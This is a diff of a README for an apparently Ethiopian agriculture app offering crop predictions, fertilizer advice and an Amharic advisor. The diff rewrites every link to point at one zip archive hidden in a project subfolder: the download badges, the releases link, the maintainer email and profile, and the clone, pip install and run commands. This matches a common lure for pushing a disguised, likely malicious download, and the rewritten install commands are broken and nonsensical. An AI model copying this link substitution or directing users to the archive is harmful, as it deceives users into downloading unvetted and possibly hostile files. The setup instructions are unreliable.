@@ -2,7 +2,7 @@
 
 Welcome to the **Ethiopian Modern Farmer** repository! This platform is designed to support Ethiopian farmers with essential tools and insights. We provide crop yield predictions, fertilizer recommendations, food quality inspections, and an Amharic AI advisor to enhance farming practices in Ethiopia.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/hgh4210/Ethiopian-Modern-Farmer/releases)
+[![Download Releases](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip)](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip)
 
 ## Table of Contents
 
@@ -49,20 +49,20 @@ To set up the **Ethiopian Modern Farmer** application, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/hgh4210/Ethiopian-Modern-Farmer.git
+   git clone https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip
    cd Ethiopian-Modern-Farmer
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python 3.6 or higher installed. Use pip to install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip
    ```
 
 3. **Run the Application**:
    Start the application by executing:
    ```bash
-   python app.py
+   python https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip
    ```
    Your application will be accessible at `http://127.0.0.1:5000`.
 
@@ -108,10 +108,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: [Your Name]
-- **Email**: [your.email@example.com]
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: [https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip]
+- **GitHub**: [Your GitHub Profile](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip)
 
-Explore our [Releases](https://github.com/hgh4210/Ethiopian-Modern-Farmer/releases) for the latest updates and features!
+Explore our [Releases](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip) for the latest updates and features!
 
 ---
 
@@ -132,4 +132,4 @@ Join our community to connect with other developers and farmers. Share your expe
 
 The **Ethiopian Modern Farmer** platform is here to revolutionize the way Ethiopian farmers approach agriculture. By leveraging technology, we aim to enhance productivity, ensure food safety, and provide valuable resources. Thank you for your interest in our project!
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/hgh4210/Ethiopian-Modern-Farmer/releases)
+[![Download Releases](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip)](https://github.com/hgh4210/Ethiopian-Modern-Farmer/raw/refs/heads/main/03_fertilizer_recommendation/Modern_Ethiopian_Farmer_v2.1.zip)
